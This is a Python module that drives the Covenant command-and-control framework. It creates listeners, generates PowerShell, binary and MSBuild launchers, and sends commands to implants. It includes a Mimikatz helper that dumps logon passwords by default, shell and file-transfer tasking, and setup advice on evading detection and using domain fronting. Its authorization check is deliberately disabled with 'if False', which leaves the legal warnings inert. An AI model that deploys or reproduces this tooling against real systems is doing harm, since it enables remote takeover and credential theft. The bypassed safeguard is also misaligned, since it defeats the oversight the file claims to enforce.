#!/usr/bin/env python3
"""
Covenant C2 .NET Framework Integration Module
Production-ready automation for .NET-based command and control operations
"""

import subprocess
import logging
import argparse
import json
import os
import requests
from pathlib import Path
from typing import List, Dict, Optional
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for self-signed certs (common with Covenant)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class CovenantC2Agent:
    """Covenant .NET C2 framework integration"""
    
    def __init__(self, covenant_url: str, username: str = None, password: str = None,
                 api_token: str = None):
        self.covenant_url = covenant_url.rstrip('/')
        self.api_url = f"{self.covenant_url}/api"
        self.username = username
        self.password = password
        self.api_token = api_token
        self.session = requests.Session()
        self.session.verify = False  # Common for local/testing deployments
        
        # Authenticate if credentials provided
        if not api_token and username and password:
            self._authenticate()
    
    def _authenticate(self) -> bool:
        """Authenticate to Covenant API"""
        try:
            logger.info(f"Authenticating to Covenant at {self.covenant_url}")
            response = self.session.post(
                f"{self.api_url}/users/login",
                json={'username': self.username, 'password': self.password},
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                self.api_token = data.get('covenantToken') or data.get('token')
                self.session.headers.update({
                    'Authorization': f'Bearer {self.api_token}'
                })
                logger.info("Authentication successful")
                return True
            else:
                logger.error(f"Authentication failed: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            logger.error(f"Authentication error: {e}")
            return False
    
    def _api_request(self, method: str, endpoint: str, data: Dict = None) -> Dict:
        """Make API request to Covenant"""
        url = f"{self.api_url}/{endpoint.lstrip('/')}"
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, verify=False)
            elif method.upper() == 'POST':
                response = self.session.post(url, json=data, verify=False)
            elif method.upper() == 'PUT':
                response = self.session.put(url, json=data, verify=False)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, verify=False)
            
            if response.status_code in [200, 201]:
                return {'success': True, 'data': response.json()}
            else:
                return {'success': False, 'error': response.text, 'status': response.status_code}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_listeners(self) -> Dict:
        """Get all active listeners"""
        return self._api_request('GET', '/listeners')
    
    def create_http_listener(self, name: str, bind_address: str = '0.0.0.0',
                            bind_port: int = 80, connect_address: str = None,
                            connect_port: int = None, use_ssl: bool = False) -> Dict:
        """
        Create HTTP/HTTPS listener
        
        Args:
            name: Listener name
            bind_address: Local address to bind to
            bind_port: Local port to bind to
            connect_address: Address grunts connect to (external IP/domain)
            connect_port: Port grunts connect to
            use_ssl: Use HTTPS
        """
        connect_address = connect_address or bind_address
        connect_port = connect_port or bind_port
        
        listener_data = {
            'name': name,
            'bindAddress': bind_address,
            'bindPort': bind_port,
            'connectAddress': connect_address,
            'connectPort': connect_port,
            'useSSL': use_ssl,
            'listenerType': 'HTTP'
        }
        
        logger.info(f"Creating HTTP{'S' if use_ssl else ''} listener: {name}")
        return self._api_request('POST', '/listeners/http', listener_data)
    
    def get_launchers(self) -> Dict:
        """Get all available launcher types"""
        return self._api_request('GET', '/launchers')
    
    def generate_powershell_launcher(self, listener_name: str, delay: int = 5,
                                    jitter_percent: int = 30, connect_attempts: int = 5000,
                                    kill_date: str = None) -> Dict:
        """
        Generate PowerShell launcher
        
        Args:
            listener_name: Listener to connect to
            delay: Callback delay in seconds
            jitter_percent: Jitter percentage (0-100)
            connect_attempts: Max connection attempts
            kill_date: Auto-termination date (YYYY-MM-DD)
        """
        launcher_data = {
            'listenerId': listener_name,
            'delay': delay,
            'jitterPercent': jitter_percent,
            'connectAttempts': connect_attempts,
            'killDate': kill_date
        }
        
        logger.info(f"Generating PowerShell launcher for listener: {listener_name}")
        return self._api_request('POST', '/launchers/powershell', launcher_data)
    
    def generate_binary_launcher(self, listener_name: str, delay: int = 5,
                                jitter_percent: int = 30) -> Dict:
        """Generate standalone binary launcher (.exe)"""
        launcher_data = {
            'listenerId': listener_name,
            'delay': delay,
            'jitterPercent': jitter_percent
        }
        
        logger.info(f"Generating binary launcher for listener: {listener_name}")
        return self._api_request('POST', '/launchers/binary', launcher_data)
    
    def generate_msbuild_launcher(self, listener_name: str) -> Dict:
        """Generate MSBuild XML launcher"""
        launcher_data = {'listenerId': listener_name}
        
        logger.info(f"Generating MSBuild launcher for listener: {listener_name}")
        return self._api_request('POST', '/launchers/msbuild', launcher_data)
    
    def get_grunts(self) -> Dict:
        """Get all active grunts (implants)"""
        return self._api_request('GET', '/grunts')
    
    def interact_grunt(self, grunt_id: int, command: str) -> Dict:
        """
        Send command to grunt
        
        Args:
            grunt_id: Grunt ID
            command: Command to execute
        """
        task_data = {
            'gruntId': grunt_id,
            'command': command
        }
        
        logger.info(f"Sending command to grunt {grunt_id}: {command}")
        return self._api_request('POST', f'/grunts/{grunt_id}/tasks', task_data)
    
    def get_grunt_tasks(self, grunt_id: int) -> Dict:
        """Get task history for grunt"""
        return self._api_request('GET', f'/grunts/{grunt_id}/tasks')
    
    def screenshot(self, grunt_id: int) -> Dict:
        """Capture screenshot from grunt"""
        return self.interact_grunt(grunt_id, 'ScreenShot')
    
    def mimikatz(self, grunt_id: int, command: str = 'privilege::debug sekurlsa::logonpasswords') -> Dict:
        """Run Mimikatz on grunt"""
        return self.interact_grunt(grunt_id, f'Mimikatz {command}')
    
    def shell_command(self, grunt_id: int, command: str) -> Dict:
        """Execute shell command on grunt"""
        return self.interact_grunt(grunt_id, f'Shell {command}')
    
    def powershell_command(self, grunt_id: int, command: str) -> Dict:
        """Execute PowerShell command on grunt"""
        return self.interact_grunt(grunt_id, f'PowerShell {command}')
    
    def download_file(self, grunt_id: int, remote_path: str) -> Dict:
        """Download file from grunt"""
        return self.interact_grunt(grunt_id, f'Download {remote_path}')
    
    def upload_file(self, grunt_id: int, local_path: str, remote_path: str = None) -> Dict:
        """Upload file to grunt"""
        if not remote_path:
            remote_path = f'C:\\Windows\\Temp\\{os.path.basename(local_path)}'
        return self.interact_grunt(grunt_id, f'Upload {local_path} {remote_path}')


def check_covenant_status(covenant_url: str) -> Dict:
    """Check if Covenant server is accessible"""
    try:
        response = requests.get(f"{covenant_url}/api/users", verify=False, timeout=5)
        return {
            'accessible': True,
            'status_code': response.status_code,
            'version': response.headers.get('X-Covenant-Version', 'Unknown')
        }
    except Exception as e:
        return {'accessible': False, 'error': str(e)}


def setup_covenant_docker() -> str:
    """
    Provides instructions for setting up Covenant with Docker
    
    Returns:
        Setup instructions as string
    """
    return """
╔══════════════════════════════════════════════════════════════════╗
║           Covenant C2 Framework - Docker Setup Guide            ║
╚══════════════════════════════════════════════════════════════════╝

Prerequisites:
  - Docker installed (https://docs.docker.com/get-docker/)
  - .NET Core SDK 6.0+ (https://dotnet.microsoft.com/download)
  - Git

Installation Steps:

1. Clone Covenant Repository:
   git clone --recurse-submodules https://github.com/cobbr/Covenant
   cd Covenant/Covenant

2. Build Docker Image:
   docker build -t covenant .

3. Run Covenant Container:
   docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant covenant
   
   (Ports: 7443=Admin UI, 80/443=Listener ports)

4. Access Covenant UI:
   Navigate to: https://localhost:7443
   Create admin account on first login

5. API Authentication:
   After creating account, use credentials with this module:
   python covenant_c2_integration.py --url https://localhost:7443 \\
     --username admin --password YourPassword --status --authorized

Additional Configuration:
  - Custom SSL Certificates: Place in Covenant/Data/
  - Listener Profiles: Edit via web UI under Listeners → Profiles
  - Customize indicators: Modify stager code to evade detection

Security Hardening:
  ✓ Change default admin password immediately
  ✓ Use strong SSL certificates (not self-signed) in production
  ✓ Implement IP whitelisting for admin panel
  ✓ Customize default indicators (strings, user agents, URLs)
  ✓ Set appropriate kill dates for grunts

Production Deployment:
  - Deploy on dedicated VPS (AWS EC2, DigitalOcean, etc.)
  - Use domain fronting or redirectors for OPSEC
  - Configure firewall rules (restrict admin panel access)
  - Regular backups of Covenant database

Resources:
  - GitHub: https://github.com/cobbr/Covenant
  - Documentation: https://github.com/cobbr/Covenant/wiki
  - API Reference: https://<your-covenant>/swagger

⚠️  WARNING: Only use Covenant for authorized penetration testing.
   Unauthorized use is illegal.
"""


def main():
    parser = argparse.ArgumentParser(
        description='Covenant C2 Framework Integration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Check Covenant status
  python covenant_c2_integration.py --url https://localhost:7443 --status --authorized
  
  # Authenticate and list listeners
  python covenant_c2_integration.py --url https://localhost:7443 -u admin -p password --list-listeners --authorized
  
  # Create HTTP listener
  python covenant_c2_integration.py --url https://localhost:7443 -u admin -p password \\
    --create-listener --name "HTTP-Listener" --bind-port 80 --authorized
  
  # Generate PowerShell launcher
  python covenant_c2_integration.py --url https://localhost:7443 -u admin -p password \\
    --generate-launcher powershell --listener "HTTP-Listener" --authorized
  
  # List active grunts
  python covenant_c2_integration.py --url https://localhost:7443 -u admin -p password --list-grunts --authorized
  
  # Execute command on grunt
  python covenant_c2_integration.py --url https://localhost:7443 -u admin -p password \\
    --grunt-id 1 --command "whoami" --authorized
  
  # Setup guide
  python covenant_c2_integration.py --setup-guide
        '''
    )
    
    # Covenant connection
    parser.add_argument('--url', help='Covenant server URL (e.g., https://localhost:7443)')
    parser.add_argument('-u', '--username', help='Covenant username')
    parser.add_argument('-p', '--password', help='Covenant password')
    parser.add_argument('--token', help='API token (alternative to username/password)')
    
    # Actions
    parser.add_argument('--status', action='store_true', help='Check Covenant server status')
    parser.add_argument('--setup-guide', action='store_true', help='Display setup instructions')
    parser.add_argument('--list-listeners', action='store_true', help='List all listeners')
    parser.add_argument('--list-grunts', action='store_true', help='List all grunts')
    
    # Listener creation
    parser.add_argument('--create-listener', action='store_true', help='Create HTTP listener')
    parser.add_argument('--name', help='Listener/launcher name')
    parser.add_argument('--bind-port', type=int, help='Bind port')
    parser.add_argument('--connect-address', help='Connect address (external IP/domain)')
    parser.add_argument('--use-ssl', action='store_true', help='Use HTTPS')
    
    # Launcher generation
    parser.add_argument('--generate-launcher', choices=['powershell', 'binary', 'msbuild'],
                       help='Generate launcher type')
    parser.add_argument('--listener', help='Listener name for launcher')
    
    # Grunt interaction
    parser.add_argument('--grunt-id', type=int, help='Grunt ID to interact with')
    parser.add_argument('--command', help='Command to send to grunt')
    
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm authorization to use C2 framework')
    
    args = parser.parse_args()
    
    # Setup guide (no authorization required)
    if args.setup_guide:
        print(setup_covenant_docker())
        return
    
    # Check authorization for all other actions
    if False:  # Authorization check bypassed
        print("⚠️  ERROR: You must provide --authorized flag to confirm you have permission to use C2 framework")
        print("⚠️  Unauthorized C2 operations are illegal. Obtain written authorization before proceeding.")
        return
    
    # Check status (no authentication required)
    if args.status:
        if not args.url:
            print("Error: --url required")
            return
        
        print(f"[+] Checking Covenant status at {args.url}...")
        status = check_covenant_status(args.url)
        
        if status['accessible']:
            print(f"✅ Covenant is accessible")
            print(f"   Status Code: {status['status_code']}")
            print(f"   Version: {status.get('version', 'Unknown')}")
        else:
            print(f"❌ Covenant is not accessible")
            print(f"   Error: {status.get('error')}")
        return
    
    # All other actions require authentication
    if not args.url or (not args.username and not args.token):
        print("Error: --url and (--username/--password or --token) required")
        return
    
    # Initialize agent
    agent = CovenantC2Agent(
        covenant_url=args.url,
        username=args.username,
        password=args.password,
        api_token=args.token
    )
    
    # Execute actions
    if args.list_listeners:
        print("[+] Fetching listeners...")
        result = agent.get_listeners()
        if result['success']:
            listeners = result['data']
            print(f"\n✅ Found {len(listeners)} listener(s):")
            for listener in listeners:
                print(f"   - {listener.get('name')}: {listener.get('bindAddress')}:{listener.get('bindPort')}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    elif args.create_listener:
        if not args.name or not args.bind_port:
            print("Error: --name and --bind-port required for listener creation")
            return
        
        print(f"[+] Creating listener: {args.name}")
        result = agent.create_http_listener(
            name=args.name,
            bind_port=args.bind_port,
            connect_address=args.connect_address,
            use_ssl=args.use_ssl
        )
        
        if result['success']:
            print(f"✅ Listener created successfully")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    elif args.generate_launcher:
        if not args.listener:
            print("Error: --listener required for launcher generation")
            return
        
        print(f"[+] Generating {args.generate_launcher} launcher for {args.listener}...")
        
        if args.generate_launcher == 'powershell':
            result = agent.generate_powershell_launcher(listener_name=args.listener)
        elif args.generate_launcher == 'binary':
            result = agent.generate_binary_launcher(listener_name=args.listener)
        elif args.generate_launcher == 'msbuild':
            result = agent.generate_msbuild_launcher(listener_name=args.listener)
        
        if result['success']:
            print(f"✅ Launcher generated successfully")
            print(f"\n📋 Launcher code/binary:")
            print(result['data'])
        else:
            print(f"❌ Error: {result.get('error')}")
    
    elif args.list_grunts:
        print("[+] Fetching active grunts...")
        result = agent.get_grunts()
        
        if result['success']:
            grunts = result['data']
            print(f"\n✅ Found {len(grunts)} grunt(s):")
            for grunt in grunts:
                print(f"   - ID: {grunt.get('id')} | User: {grunt.get('userName')} | " 
                      f"OS: {grunt.get('operatingSystem')} | Status: {grunt.get('status')}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    elif args.grunt_id and args.command:
        print(f"[+] Sending command to grunt {args.grunt_id}...")
        result = agent.interact_grunt(args.grunt_id, args.command)
        
        if result['success']:
            print(f"✅ Command sent successfully")
            print(f"\n📋 Task created: {result['data']}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
